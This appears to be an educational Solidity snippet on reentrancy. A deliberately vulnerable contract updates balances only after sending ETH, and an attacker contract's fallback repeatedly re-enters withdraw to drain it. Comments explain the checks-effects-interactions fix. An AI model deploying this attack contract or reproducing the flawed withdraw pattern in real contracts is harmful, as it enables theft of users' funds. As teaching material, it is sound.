// Reentrancy Attack

// To prevent, it's crucial to follow best practices such as the
// "Checks-Effects-Interactions" pattern and ensure that external
// calls are made after all internal state changes. Additionally,
// use mutexes or checks to prevent reentrant calls.

// VulnerableContract.sol
pragma solidity ^0.8.0;

contract VulnerableContract {
    mapping(address => uint) private balances;

    function withdraw(uint _amount) public {

        // Vulnerability is here. The `withdraw` fn first transfers ETH to
        // the caller's address using msg.sender.call{value: _amount}("") 
        // and then updates the balance => potential reentrancy attack.

        if (balances[msg.sender] >= _amount) {
            (bool success, ) = msg.sender.call{value: _amount}("");
            if (success) {
                balances[msg.sender] -= _amount;
            }
        }
    }

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }
}


// MaliciousContract.sol
// Step 1: Attacker deploys this contract, sets `vulnerableContract` address
pragma solidity ^0.8.0;

contract MaliciousContract {
    VulnerableContract vulnerableContract;

    constructor(address _vulnerableContractAddress) {
        vulnerableContract = VulnerableContract(_vulnerableContractAddress);
    }

    fallback() external payable {
        vulnerableContract.withdraw(msg.value);
    }

    // Step 2: The attacker calls `attack` fn of MaliciousContract,
    //   deposits a significant amount of Ether then withdraws it
    //   before balances are updated in VulnerableContract `withdraw`.
    //   The `fallback` fn is triggered by receiving ETH, which
    //   is recursively called until all ETH is drained.
    function attack() public payable {
        vulnerableContract.deposit{value: msg.value}();
        vulnerableContract.withdraw(msg.value);
    }
}
